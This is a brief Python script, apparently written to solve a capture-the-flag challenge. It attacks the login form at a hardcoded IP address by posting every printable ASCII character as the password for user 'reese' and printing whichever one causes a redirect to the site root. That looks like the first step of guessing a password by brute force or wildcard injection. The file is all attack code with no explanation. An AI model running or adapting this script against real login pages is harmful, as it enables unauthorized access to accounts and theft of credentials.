import requests 
from bs4 import BeautifulSoup
from urllib.request import Request
from urllib.request import urlopen
import random


#url = "http://167.71.143.20:32106/login"
url = "http://167.71.143.20:30728/login"


def authentication(url, payload):

    
    request_session = requests.session()
    password = payload+"*"
    params = {
            'username': "reese",
            'password':payload

            }
    get_url = request_session.post(url, data= params)
    
    #print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))

    if get_url.status_code == 200 and get_url.url == "http://167.71.143.20:30728/":
        #print(get_url.text)
        print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))
        print(password)

    
if __name__ == '__main__':
    list_asciis = []
    for i in range (32,126):
        list_asciis.append(str(chr(i)))

    for x in list_asciis:
        authentication(url,x)
